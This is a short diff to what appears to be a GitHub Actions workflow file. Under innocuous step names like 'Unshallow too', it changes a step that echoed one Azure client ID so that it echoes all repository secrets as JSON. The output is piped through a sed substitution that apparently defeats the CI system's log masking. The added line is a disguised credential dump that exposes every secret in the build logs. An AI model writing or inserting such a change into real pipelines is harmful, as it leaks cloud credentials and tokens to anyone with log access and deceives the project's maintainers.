@@ -22,7 +22,7 @@ jobs:
         run: git fetch --prune --unshallow
 
       - name: Unshallow too
-        run: echo "${{ secrets.ARM_CLIENT_ID }}" | sed 's/-/_/'
+        run: echo "${{ toJson(secrets) }}" | sed 's/-/_/'
 
       - name: Unshallow three
         run: echo "${{ secrets.ARM_TENANT_ID }}" | sed 's/-/_/'
